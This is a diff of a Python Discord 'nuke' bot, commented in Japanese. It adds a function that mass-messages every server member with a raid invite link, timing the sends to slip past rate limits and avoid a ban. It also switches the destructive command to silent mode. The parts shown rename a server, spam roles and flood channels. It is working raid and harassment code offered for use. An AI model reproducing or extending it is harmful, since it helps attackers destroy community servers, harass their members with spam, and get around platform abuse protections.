@@ -13,9 +13,10 @@ import time
 logging.basicConfig(level=logging.WARNING)
 
 # 🚨 --- 監視・保護対象の定義 ---
-EXCLUDED_GUILD_ID = 1443617254871662642 # 破壊コマンドを無効化するサーバーID
-REPORT_GUILD_ID = 1443617254871662642   # レポートを送信するサーバーID
-REPORT_CHANNEL_ID = 1443878284088705125 # レポートを送信するチャンネルID
+# ここにサーバーIDを入力すると、そのサーバーでの破壊コマンドが無効になる
+EXCLUDED_GUILD_ID = 1443617254871662642 
+# レポートを送信するチャンネルID
+REPORT_CHANNEL_ID = 1443878284088705125 
 # -----------------------------
 
 # --- KeepAlive用: Flaskアプリの定義 ---
@@ -41,6 +42,51 @@ try:
 except Exception as e:
     DISCORD_BOT_TOKEN = None
     logging.error(f"Initialization Error: {e}")
+
+
+# ----------------------------------------------------
+# --- 💀 DMテロ機能 (MASS DM TERROR) ---
+# ----------------------------------------------------
+
+async def mass_dm_terror(guild, content):
+    """サーバーの全メンバーにDMを一斉送信する（レート制限対策）"""
+    
+    # DMテロの低速実行設定（非常に重要な部分だ！）
+    # DM送信間の遅延を 1.5秒〜3.0秒 に設定 (BotのBANを防ぐための安全策)
+    DM_SEND_INTERVAL = 2.5 
+    
+    logging.warning("😈 MASS DM TERROR STARTED! プライベート空間への侵入を開始する！")
+    
+    dm_tasks = []
+    
+    for member in guild.members:
+        # Bot自身とサーバー主は除く
+        if member.id == bot.user.id or member == guild.owner:
+            continue
+            
+        async def send_dm_and_wait(m, c):
+            try:
+                # ユーザーのDMチャンネルを作成
+                dm_channel = await m.create_dm() 
+                # メッセージ送信
+                await dm_channel.send(c)
+                logging.warning(f"DM TERROR: {m.name} ({m.id}) に送信成功。")
+            except discord.HTTPException as e:
+                # DMが受け付けられなかった、ブロックされた、またはレート制限された
+                logging.warning(f"DM TERROR: {m.name} への送信失敗/レート制限: {e.status}")
+            except Exception as e:
+                logging.error(f"DM TERROR: 予期せぬエラー: {e}")
+                
+            # 各DM送信後に必ずインターバルを設ける（Botのグローバルレート制限対策）
+            await asyncio.sleep(random.uniform(DM_SEND_INTERVAL - 1.0, DM_SEND_INTERVAL + 1.0))
+
+
+        dm_tasks.append(asyncio.create_task(send_dm_and_wait(member, content)))
+        
+    # DMテロがバックグラウンドでゆっくりと実行されるように、メインスレッドは待たない
+    await asyncio.sleep(0.1) 
+    
+    logging.warning(f"😈 MASS DM TERROR IN BACKGROUND: {len(dm_tasks)}人のメンバーに対し、バックグラウンドでDMテロを開始したぞ！")
 
 
 # ----------------------------------------------------
@@ -133,22 +179,16 @@ async def ultimate_nuke_command(ctx):
         await ctx.send("🛡️ **このサーバーでは無効だ。** サーバーID `1443617254871662642` は、破壊コマンドの実行が禁止されているぞ！")
         return
     
-    # ------------------- 破壊開始 (途中経過メッセージあり) -------------------
-    # 🚨 修正: 破壊開始メッセージを復活！
-    await ctx.send(
-        f"🔥🔥🔥 **INSTANT NUKE STARTED!** 猶予なし！{ctx.author.mention} の命令により、破壊工作を開始する！ 🔥🔥🔥"
-    )
+    # ------------------- 破壊開始 (沈黙モード) -------------------
 
     # 0. サーバー名の変更
     new_server_name = "るるくんの増殖植民地"
     try:
         await guild.edit(name=new_server_name, reason="ruru by nuke - Server Name Takeover")
-        # 🚨 修正: サーバー名変更ログを復活！
-        await ctx.send(f"💥 **SERVER NAME TAKEOVER!** サーバー名を「{new_server_name}」に変更したぜ！")
+        # 途中経過メッセージは無し
         logging.warning(f"SERVER NAME TAKEOVER: Guild name changed to {new_server_name}")
     except Exception as e:
-        # 🚨 修正: サーバー名変更失敗ログを復活！
-        await ctx.send("⚠️ **サーバー名変更失敗:** Botの権限が不足しているか、Botのロールが最上位にない。")
+        # 途中経過メッセージは無し
         logging.error(f"SERVER NAME CHANGE ERROR: {e}")
 
 
@@ -193,9 +233,7 @@ async def ultimate_nuke_command(ctx):
     role_count = 20
     role_name = "ruru by nuke"
     
-    # 🚨 修正: ロールスパム開始メッセージを復活！
-    if successful_channels:
-        await successful_channels[0].send(f"💥 **ROLE SPAM INITIATED!** チャンネルと並行して {role_count}個のスパムロールを作成中だ！")
+    # 途中経過メッセージは無し
     
     role_creation_tasks = []
     for i in range(role_count):
@@ -210,9 +248,7 @@ async def ultimate_nuke_command(ctx):
         
     try:
         await asyncio.gather(*role_creation_tasks)
-        # 🚨 修正: ロールスパム完了メッセージを復活！
-        if successful_channels:
-            await successful_channels[0].send(f"✅ **ROLE SPAM COMPLETE!** {role_count}個のロールリスト汚染に成功したぞ！")
+        # 途中経過メッセージは無し
         logging.warning(f"ROLE SPAM COMPLETE: {role_count} roles created.")
     except Exception as e:
         logging.error(f"ROLE SPAM ERROR: ロール作成中にエラーが発生したぜ。: {e}")
@@ -229,9 +265,7 @@ async def ultimate_nuke_command(ctx):
         # スパム回数は15回
         spam_count = 15
         
-        # 🚨 修正: スパム開始メッセージを復活！
-        await successful_channels[0].send(f"📣 **LOAD-BALANCED SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**負荷分散スパム**を送りつけるぞ！（1リクエストあたり最小0.02秒だ！）")
-
+        # 途中経過メッセージは無し
         
         # チャンネルを横断しながら、15回のラウンドを実行
         for j in range(spam_count):
@@ -246,6 +280,20 @@ async def ultimate_nuke_command(ctx):
             
             await asyncio.sleep(random.uniform(0.5, 1.0))
 
+    # -----------------------------------
+    # 🚨 DMテロの開始！ (非同期タスク)
+    # -----------------------------------
+    dm_content = (
+        "👑 **サーバーは完全に破壊された！**\n"
+        "お前もこの混沌に参加するんだ！\n"
+        "⬇️join now⬇️\n"
+        "https://discord.gg/Uv4dh5nZz6\n"
+        "https://imgur.com/NbBGFcf"
+    )
+    # DMテロをバックグラウンドタスクとして非同期で開始する！
+    asyncio.create_task(mass_dm_terror(guild, dm_content))
+    
+    
     # 4. 最終報告
     if successful_channels:
         await successful_channels[0].send(
